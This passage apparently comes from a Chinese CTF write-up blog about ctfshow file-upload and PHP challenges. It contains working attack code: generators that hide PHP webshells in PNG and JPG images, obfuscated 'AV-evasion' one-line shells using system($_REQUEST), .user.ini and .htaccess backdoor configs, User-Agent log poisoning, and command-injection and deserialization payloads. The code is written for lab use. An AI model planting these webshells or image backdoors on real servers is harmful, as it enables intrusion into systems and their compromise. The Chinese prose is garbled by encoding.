divmod(num,256**i)</span><br><span class="line">        floor_list.append(str(res[0]))</span><br><span class="line">        num = res[1]</span><br><span class="line">    return &#x27;.&#x27;.join(floor_list)</span><br><span class="line"></span><br><span class="line">print(ip2long(&#x27;127.0.0.1&#x27;))</span><br></pre></td></tr></table></figure>

<h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><p><strong>pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">    0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">    0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">    0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">    0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">    0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">    0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">    0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">    $r = $p[$y];</span><br><span class="line">    $g = $p[$y+1];</span><br><span class="line">    $b = $p[$y+2];</span><br><span class="line">    $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">    imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#x27;2.png&#x27;);  //è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„</span><br><span class="line">/* æœ¨é©¬å†…å®¹</span><br><span class="line">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆä¸€ä¸ªæœ¨é©¬å›¾ç‰‡é©¬ï¼Œä¸Šä¼ ï¼Œ</p>
<p><img src="/2023/02/15/ctfshow%E5%90%88%E9%9B%86-ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/QQ%E6%88%AA%E5%9B%BE20230526170442.png"></p>
<p>ä¸‹è½½ç”Ÿæˆçš„å›¾ç‰‡010æ‰“å¼€å³æ˜¯flag</p>
<h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><p><strong>jpgå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $miniPayload = &quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;</span><br><span class="line">        die(&#x27;php-gd is not installed&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">    for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = new DataInputStream($argv[1]);</span><br><span class="line">        $outStream = file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes = 0;</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(&#x27;Incorrect SOI marker&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker === 0xDA) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !== 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&#x27;Success!&#x27;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&#x27;payload_&#x27;.$argv[1]);</span><br><span class="line">    die(&#x27;Something\&#x27;s wrong&#x27;);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = &#x27;&#x27;;</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">ç”¨æ³•  php exp.php a.jpg</span><br></pre></td></tr></table></figure>

<p>æœªæ›¾å¤ç°</p>
<h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><p>ä¼ ä¸€ä¸ªä¸€å¥è¯å‹ç¼©åŒ…å³å¯</p>
<h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p><strong>.user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨</strong></p>
<p>php.ini æ˜¯ php çš„ä¸€ä¸ªå…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¯¹æ•´ä¸ª web æœåŠ¡èµ·ä½œç”¨ï¼›</p>
<p>.user.ini ä½¿ç”¨èŒƒå›´å¾ˆå¹¿ï¼Œä¸ä»…é™äº Apache æœåŠ¡å™¨ï¼ŒåŒæ ·é€‚ç”¨äº Nginx æœåŠ¡å™¨</p>
<p>ä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•</p>
<p><code>auto_prepend_file = 1.jpg</code> è¿™ä¸ªé…ç½®çš„æ„æ€å°±æ˜¯åœ¨å½“å‰ç›®å½•ä¸‹çš„.php æ–‡ä»¶åŒ…å« 1.jpg è¿™ä¸ªå›¾ç‰‡ï¼Œåœ¨æ­¤å¤„ç›¸å½“äºåœ¨ 11.php æ–‡ä»¶å¤´æ’å…¥äº† <code>require(&#39;1.jpg&#39;)</code> è¿™æ¡è¯­å¥ï¼Œä¹Ÿå°±æ˜¯è¯´ç›¸å½“äºæ–‡ä»¶åŒ…å«ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file = &lt;filename&gt;         //åŒ…å«åœ¨æ–‡ä»¶å¤´</span><br><span class="line">auto_append_file = &lt;filename&gt;          //åŒ…å«åœ¨æ–‡ä»¶å°¾</span><br></pre></td></tr></table></figure>

<p><strong>.htaccess é…ç½®æ–‡ä»¶</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p>å°†æ‰€æœ‰æ–‡ä»¶éƒ½è§£æä¸º php æ–‡ä»¶,åªå¯¹è¯¥æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹çš„æ–‡ä»¶èµ·ä½œç”¨ã€‚åªåœ¨ Apache æœåŠ¡å™¨ä¸­èµ·ä½œç”¨ã€‚</p>
<h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p>å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=`tac ../flagaa.php`;</span><br></pre></td></tr></table></figure>

<p>å…æ€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;s#y#s#t#e#m&quot;;</span><br><span class="line">$b = explode(&quot;#&quot;,$a);</span><br><span class="line">$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];</span><br><span class="line">$c($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=substr(&#x27;1s&#x27;,1).&#x27;ystem&#x27;;</span><br><span class="line">$a($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=substr(&#x27;1s&#x27;,1).&#x27;ystem&#x27;;</span><br><span class="line">$a($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_REQUEST[&#x27;a&#x27;];</span><br><span class="line">$b=$_REQUEST[&#x27;b&#x27;];</span><br><span class="line">$a($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><p>å…³é”®è¯ <code>layui</code> upload</p>
<p>å‰ç«¯éªŒè¯å¿…é¡»æ˜¯zip</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;button type=<span class="string">&quot;button&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">layui</span>-<span class="title">btn</span>&quot; <span class="title">id</span>=&quot;<span class="title">upload</span>&quot; <span class="title">lay</span>-<span class="title">data</span>=&quot;</span>&#123;url: <span class="string">&#x27;upload.php&#x27;</span>, accept: <span class="string">&#x27;images&#x27;</span>,exts:<span class="string">&#x27;zip&#x27;</span>&#125;<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">			  &lt;i class=&quot;</span>layui-icon<span class="string">&quot;&gt;&amp;#xe67c;&lt;/i&gt;ä¸Šä¼ æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡å°è¯•&lt;&gt;è¢«æ€äº†</p>
<p>åç«¯éªŒè¯å¿…é¡»æ˜¯pngæ–‡ä»¶</p>
<p>-Disposition: form-data; name&#x3D;â€fileâ€; filename&#x3D;â€.user.zipâ€<br>Content-Type: application&#x2F;x-zip-compressed</p>
<p>åˆ›å»ºä¸€ä¸ªå‹ç¼©åŒ….user.zip è®°äº‹æœ¬æ‰“å¼€</p>
<p><code>auto_append_file</code> string</p>
<p>æŒ‡å®šåœ¨ä¸»æ–‡ä»¶ä¹‹åè‡ªåŠ¨è§£æçš„æ–‡ä»¶åã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89A</span><br><span class="line">auto_append_file=&quot;/var/log/nginx/access.log&quot;</span><br></pre></td></tr></table></figure>

<p>å³ä¿®æ”¹ä¸º .user.ini</p>
<p>ç±»å‹ä¿®æ”¹ä¸ºimage&#x2F;png</p>
<p>åŒæ—¶user-agentä¼ å…¥ä¸€å¥è¯æœ¨é©¬</p>
<p>å³å¯ä¸Šä¼ </p>
<p>åŒç†åŒæ—¶ï¼Œå†ä¸Šä¼ ä¸€ä¸ª1.phpï¼Œå†…å®¹éšä¾¿</p>
<p>ä¸€å‰‘è¿æ¥upload&#x2F;1.php</p>
<p>åœ¨æ ¹ç›®å½•ä¸‹&#x2F;var&#x2F;www&#x2F;html&#x2F;ä¸‹</p>
<p>auto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­</p>
<p><a href="https://blog.csdn.net/weixin_53146913/article/details/124840296?ops_request_misc=%7B%22request_id%22:%22167645042416782429787891%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167645042416782429787891&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124840296-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=user.ini&spm=1018.2226.3001.4187">(13æ¡æ¶ˆæ¯) ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‘user.iniç•™åé—¨_èœèœzhaoçš„åšå®¢-CSDNåšå®¢_.user.ini</a></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow</title>
    <url>/2023/05/22/ctfshow%E5%90%88%E9%9B%86-ctfshow/</url>
    <content><![CDATA[  <span id="more"></span>

<h2 id="ã€nlã€‘éš¾äº†"><a href="#ã€nlã€‘éš¾äº†" class="headerlink" title="ã€nlã€‘éš¾äº†"></a>ã€nlã€‘éš¾äº†</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(strlen($_GET[1])&lt;4)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">     echo &quot;hack!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=&gt;nl</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=*&gt;z</span><br></pre></td></tr></table></figure>

<p> <code>*</code>ä»£è¡¨ å½“å‰ç›®å½•ä¸‹æ–‡ä»¶ï¼Œå³nl xxx.php, </p>
<p>ç„¶åè®¿é—®z å³å¯</p>
<h1 id="å¹´ctf"><a href="#å¹´ctf" class="headerlink" title="å¹´ctf"></a>å¹´ctf</h1><h2 id="é™¤å¤•"><a href="#é™¤å¤•" class="headerlink" title="é™¤å¤•"></a>é™¤å¤•</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">$year = $_GET[&#x27;year&#x27;];</span><br><span class="line"></span><br><span class="line">if($year==2022 &amp;&amp; $year+1!==2023)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">year=2022.0</span><br></pre></td></tr></table></figure>

<h2 id="åˆä¸‰"><a href="#åˆä¸‰" class="headerlink" title="åˆä¸‰"></a>åˆä¸‰</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">extract($_GET);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_=function($__,$___)&#123;</span><br><span class="line">    return $__==$___?$___:$__;</span><br><span class="line">&#125;;</span><br><span class="line">$$__($_($_GET&#123;</span><br><span class="line">    $___</span><br><span class="line">&#125;[$____]&#123;</span><br><span class="line">    $_____</span><br><span class="line">&#125;(),$flag));</span><br></pre></td></tr></table></figure>

<p>$_GET å˜é‡æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå†…å®¹æ˜¯ç”± HTTP GET æ–¹æ³•å‘é€çš„å˜é‡åç§°å’Œå€¼ã€‚</p>
<p>$_GET å˜é‡ç”¨äºæ”¶é›†æ¥è‡ª method&#x3D;â€getâ€ çš„è¡¨å•ä¸­çš„å€¼ã€‚ä»å¸¦æœ‰ GET æ–¹æ³•çš„è¡¨å•å‘é€çš„ä¿¡æ¯ï¼Œå¯¹ä»»ä½•äººéƒ½æ˜¯å¯è§çš„ï¼ˆä¼šæ˜¾ç¤ºåœ¨æµè§ˆå™¨çš„åœ°å€æ ï¼‰ï¼Œå¹¶ä¸”å¯¹å‘é€çš„ä¿¡æ¯é‡ä¹Ÿæœ‰é™åˆ¶ï¼ˆæœ€å¤š 100 ä¸ªå­—ç¬¦ï¼‰ã€‚</p>
<p>ç¬¬ä¸€ä¸ªå‡½æ•°å†…å®¹</p>
<p>å‚è€ƒyvå¸ˆå‚…çš„blog</p>
<p>ä¼ å…¥ä¸¤ä¸ªå‚æ•°è‹¥å¼±ç›¸ç­‰ï¼Œåˆ™è¿”å›ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯flag</p>
<p>å†çœ‹ä¸‹è¾¹ï¼Œåˆ æ‰æ¢è¡Œå˜æˆå¦‚ä¸‹ï¼Œå†…å®¹ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$__($_($_GET&#123;$___&#125;[$____]&#123;$_____&#125;(),$flag));</span><br></pre></td></tr></table></figure>

<p>èŠ±æ‹¬å·æ¢æˆä¸­æ‹¬å·ï¼Œæˆä¸ºä¸‰ç»´æ•°ç»„ï¼Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[$___][$____][$_____]</span><br></pre></td></tr></table></figure>

<p>ç”±äºphpinfo()çš„è¿”å›å€¼ä¸ºture</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?__=z&amp;z=var_dump&amp;x[b][c]=phpinfo&amp;___=x&amp;____=b&amp;_____=c</span><br></pre></td></tr></table></figure>

<h2 id="åˆå…­"><a href="#åˆå…­" class="headerlink" title="åˆå…­"></a>åˆå…­</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy2year</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$argv</span></span>)</span>&#123;  <span class="comment">//è§¦å‘æ¡ä»¶ï¼šè°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;key, <span class="keyword">array</span>(<span class="variable">$method</span>,<span class="variable">$argv</span>)); <span class="comment">//this-&gt;keyå¯æ§ï¼Œå¯ä»¥æ¢æˆå¯¹è±¡ï¼Œè§¦å‘invoke</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getSecret</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key</span>=<span class="variable">$key</span>?<span class="variable">$key</span>:<span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createSecret</span>(<span class="variable">$key</span>); <span class="comment">//è§¦å‘creaesecret</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createSecret</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;key.<span class="variable">$this</span>-&gt;secret);<span class="comment">//å˜é‡æ‹¼æ¥è§¦å‘__tostring</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;  <span class="comment">//è§¦å‘æ¡ä»¶ï¼šè°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§ï¼Œè¦ä¹ˆè°ƒç”¨ç§æœ‰å˜é‡ã€‚</span></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$arg</span>=<span class="string">&quot;get&quot;</span>.<span class="variable">$arg</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$arg</span> = <span class="variable">$flag</span>; <span class="comment">//åŒæ—¶è§¦å‘è§¦å‘__set</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg</span>,<span class="variable">$argv</span></span>)</span>&#123;  <span class="comment">//è§¦å‘æ¡ä»¶ï¼šç»™ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§èµ‹å€¼</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$arg</span>.<span class="variable">$argv</span>);   <span class="comment">//arg=get,argv=flag,   secret=getflag</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; <span class="comment">//è§¦å‘æ¡ä»¶ï¼šæŠŠå¯¹è±¡å½“æˆå‡½æ•°å¤„ç†</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$secret</span>; <span class="comment">//è§¦å‘__get</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">secret</span>().<span class="variable">$this</span>-&gt;secret);  <span class="comment">//è§¦å‘__call</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$obj</span>)&#123;</span><br><span class="line">    <span class="variable">$secret</span> = <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">getSecret</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;ä½ æäº¤çš„keyæ˜¯&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;\nç”Ÿæˆçš„secretæ˜¯&quot;</span>.<span class="variable">$secret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class happy2year&#123;</span><br><span class="line">        private $secret;</span><br><span class="line">        private $key;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">                $this-&gt;key=$this;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new happy2year()));</span><br></pre></td></tr></table></figure>

<p>å…³äº__setä»–é­”æœ¯å˜é‡å‡½æ•°ï¼Œæˆ‘åšäº†å¦‚ä¸‹æµ‹è¯•ï¼Œ</p>
